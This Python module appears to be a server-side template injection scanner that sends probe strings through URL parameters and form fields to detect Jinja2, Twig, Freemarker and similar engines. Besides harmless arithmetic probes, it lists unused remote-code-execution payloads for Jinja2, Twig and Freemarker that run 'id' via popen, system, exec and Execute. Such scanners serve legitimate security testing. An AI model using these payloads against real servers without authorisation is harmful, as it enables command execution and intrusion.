"""
Server-Side Template Injection (SSTI) Scanner for Web-Cross
Detects template injection vulnerabilities in Jinja2, Twig, Freemarker, etc.
"""

import re
import requests
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse, parse_qs, urlencode


@dataclass
class SSTIFinding:
    """SSTI vulnerability finding."""
    vuln_type: str
    severity: str
    template_engine: str
    payload: str
    evidence: str
    parameter: str


class SSTIScanner:
    """
    Server-Side Template Injection Scanner.
    
    Tests for:
    - Jinja2 (Python)
    - Twig (PHP)
    - Freemarker (Java)
    - Velocity (Java)
    - Smarty (PHP)
    - Mako (Python)
    - Pebble (Java)
    - ERB (Ruby)
    """
    
    # Detection payloads - mathematical operations that expose template engines
    DETECTION_PAYLOADS = [
        # Universal detection
        ("{{7*7}}", "49", "Jinja2/Twig/Nunjucks"),
        ("${7*7}", "49", "Freemarker/Velocity/Mako"),
        ("#{7*7}", "49", "Ruby ERB/Thymeleaf"),
        ("<%= 7*7 %>", "49", "ERB/EJS"),
        ("{{= 7*7 }}", "49", "Handlebars"),
        ("${{7*7}}", "49", "Java EL"),
        ("{7*7}", "49", "Smarty"),
        ("*{7*7}", "49", "Thymeleaf"),
        
        # Jinja2 specific
        ("{{config}}", "Config", "Jinja2"),
        ("{{self}}", "TemplateReference", "Jinja2"),
        ("{{request}}", "Request", "Jinja2"),
        
        # Twig specific
        ("{{_self.env}}", "Environment", "Twig"),
        ("{{app.request}}", "Request", "Twig"),
        
        # Freemarker specific
        ("${.version}", "Freemarker", "Freemarker"),
        ("${.now}", "datetime", "Freemarker"),
        
        # String concatenation detection
        ("{{\"foo\"+\"bar\"}}", "foobar", "Jinja2/Twig"),
        ("${\"foo\"+\"bar\"}", "foobar", "Freemarker"),
        ("#{\"foo\"+\"bar\"}", "foobar", "ERB"),
    ]
    
    # Exploitation payloads (for confirmation only - don't execute)
    EXPLOIT_PAYLOADS = {
        "Jinja2": [
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{config.__class__.__init__.__globals__['os']}}",
            "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
        ],
        "Twig": [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
        ],
        "Freemarker": [
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        ],
    }
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.findings: List[SSTIFinding] = []
    
    def _extract_params(self, url: str) -> List[str]:
        """Extract query parameters from URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _test_payload(
        self, 
        url: str, 
        param: str, 
        payload: str, 
        expected: str, 
        engine: str
    ) -> Optional[SSTIFinding]:
        """Test a single SSTI payload."""
        try:
            test_url = self._inject_payload(url, param, payload)
            resp = requests.get(test_url, timeout=self.timeout)
            
            if expected.lower() in resp.text.lower():
                return SSTIFinding(
                    vuln_type="SSTI",
                    severity="Critical",
                    template_engine=engine,
                    payload=payload,
                    evidence=f"Pattern '{expected}' found in response",
                    parameter=param
                )
        except:
            pass
        
        return None
    
    def _test_post_payload(
        self,
        url: str,
        data: Dict[str, str],
        field: str,
        payload: str,
        expected: str,
        engine: str
    ) -> Optional[SSTIFinding]:
        """Test SSTI via POST data."""
        try:
            test_data = data.copy()
            test_data[field] = payload
            
            resp = requests.post(url, data=test_data, timeout=self.timeout)
            
            if expected.lower() in resp.text.lower():
                return SSTIFinding(
                    vuln_type="SSTI",
                    severity="Critical",
                    template_engine=engine,
                    payload=payload,
                    evidence=f"Pattern '{expected}' found in response",
                    parameter=field
                )
        except:
            pass
        
        return None
    
    def scan_url(self, url: str) -> List[SSTIFinding]:
        """Scan URL parameters for SSTI."""
        findings = []
        params = self._extract_params(url)
        
        if not params:
            return findings
        
        for param in params:
            for payload, expected, engine in self.DETECTION_PAYLOADS:
                finding = self._test_payload(url, param, payload, expected, engine)
                if finding:
                    findings.append(finding)
                    break  # Found vuln in this param, move to next
        
        return findings
    
    def scan_form(self, url: str, form_data: Dict[str, str]) -> List[SSTIFinding]:
        """Scan POST form fields for SSTI."""
        findings = []
        
        for field in form_data.keys():
            for payload, expected, engine in self.DETECTION_PAYLOADS:
                finding = self._test_post_payload(
                    url, form_data, field, payload, expected, engine
                )
                if finding:
                    findings.append(finding)
                    break
        
        return findings
    
    def scan(self, url: str, form_data: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """Run SSTI scan on URL and optional form data."""
        self.findings = []
        
        # Scan URL params
        url_findings = self.scan_url(url)
        self.findings.extend(url_findings)
        
        # Scan form if provided
        if form_data:
            form_findings = self.scan_form(url, form_data)
            self.findings.extend(form_findings)
        
        return [
            {
                "type": f.vuln_type,
                "severity": f.severity,
                "template_engine": f.template_engine,
                "payload": f.payload,
                "evidence": f.evidence,
                "parameter": f.parameter,
            }
            for f in self.findings
        ]


# Singleton
_scanner: Optional[SSTIScanner] = None


def get_scanner() -> SSTIScanner:
    """Get singleton scanner instance."""
    global _scanner
    if _scanner is None:
        _scanner = SSTIScanner()
    return _scanner
